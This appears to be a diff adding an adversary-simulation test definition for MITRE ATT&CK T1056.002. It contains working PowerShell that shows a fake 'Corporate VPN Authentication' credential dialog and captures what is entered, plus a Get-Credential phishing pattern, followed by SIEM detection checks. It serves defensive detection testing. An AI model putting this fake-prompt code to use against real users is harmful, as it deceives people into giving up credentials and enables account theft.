@@ -1,0 +1,101 @@
+id: T1056.002_input_capture_gui
+name: "Input Capture — GUI Input Capture"
+mitre_technique: "T1056.002"
+mitre_tactic: "collection"
+description: >
+  Adversaries present fake credential prompts that mimic legitimate Windows dialogs
+  (UAC prompts, network credential dialogs, VPN login screens) to trick users into
+  entering credentials. On Windows, CredUIPromptForCredentials and
+  CredUIPromptForWindowsCredentials display native-looking credential dialogs.
+  PowerShell's Get-Credential cmdlet renders the same UI. Adversaries invoke these
+  with plausible context messages. The user sees a familiar-looking dialog and enters
+  their credentials, which are captured by the adversary's process rather than
+  going to a legitimate service.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1056/002/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1056.002 — GUI Input Capture simulation (dialog displayed — do NOT enter real credentials)"
+
+  - step: 2
+    type: exec_powershell
+    description: "Invoke native Windows credential prompt — CredUI dialog"
+    command: |
+      Add-Type @"
+      using System;
+      using System.Runtime.InteropServices;
+      using System.Text;
+
+      public class PASCredUI {
+          [DllImport("credui.dll", CharSet=CharSet.Unicode)]
+          public static extern int CredUIPromptForCredentials(
+              IntPtr pUiInfo, string pszTargetName, IntPtr Reserved,
+              int dwAuthError, StringBuilder pszUserName, int ulUserNameMaxChars,
+              StringBuilder pszPassword, int ulPasswordMaxChars,
+              ref bool pfSave, int dwFlags);
+      }
+"@
+      $user = New-Object Text.StringBuilder 256
+      $pass = New-Object Text.StringBuilder 256
+      $save = $false
+      # CREDUI_FLAGS_ALWAYS_SHOW_UI=0x80 | CREDUI_FLAGS_DO_NOT_PERSIST=0x2
+      $flags = 0x82
+
+      Write-Host "[PAS] Displaying fake credential prompt — DO NOT ENTER REAL CREDENTIALS"
+      Write-Host "[PAS] This mimics a legitimate Windows authentication dialog"
+
+      $result = [PASCredUI]::CredUIPromptForCredentials(
+          [IntPtr]::Zero,
+          "Corporate VPN Authentication",  # Target looks legitimate
+          [IntPtr]::Zero, 0,
+          $user, 256, $pass, 256,
+          [ref]$save, $flags)
+
+      if ($result -eq 0) {
+          Write-Host "[PAS] Credentials entered — user=$($user.ToString()) (captured)"
+          Write-Host "[PAS] Real implant: exfiltrate to C2 via HTTP"
+      } elseif ($result -eq 1223) {
+          Write-Host "[PAS] Dialog cancelled by user — no credentials captured"
+      } else {
+          Write-Host "[PAS] CredUI result code: $result"
+      }
+
+  - step: 3
+    type: exec_powershell
+    description: "Simulate Get-Credential prompt — PowerShell native credential dialog"
+    command: |
+      Write-Host "[PAS] PowerShell Get-Credential credential capture pattern:"
+      Write-Host "[PAS] Real: `$creds = Get-Credential -Message 'Windows Update requires credentials'"
+      Write-Host "[PAS] After capture: `$creds.GetNetworkCredential().Password"
+      Write-Host "[PAS] Skipping actual prompt — dialog already shown in step 2"
+      Write-Host "[PAS] Detection: Get-Credential in script block logs in non-admin context is suspicious"
+
+  - step: 4
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 5
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — CredUIPromptForCredentials / Get-Credential in script block logs from unexpected process"
+
+cleanup:
+  - step: 1
+    type: marker
+    description: "No persistent artifacts"
+    message: "T1056.002 cleanup complete — no persistent artifacts"
+
+analyst_checklist:
+  - "Script block logging (4104): Get-Credential or CredUIPromptForCredentials in non-administrative script"
+  - "Process event: powershell.exe spawning credui.dll dialog outside of legitimate admin workflow"
+  - "Sentinel: DeviceEvents | where ActionType == 'PowerShellCommand' and AdditionalFields contains 'Get-Credential'"
+  - "MDE alert: 'Fake credential prompt detected'"
+  - "CONTROL CHECK: Security awareness training — employees should recognise unexpected credential prompts as suspicious"
+  - "CONTROL CHECK: Phishing-resistant MFA (FIDO2/Windows Hello) — captured password is insufficient without hardware key"
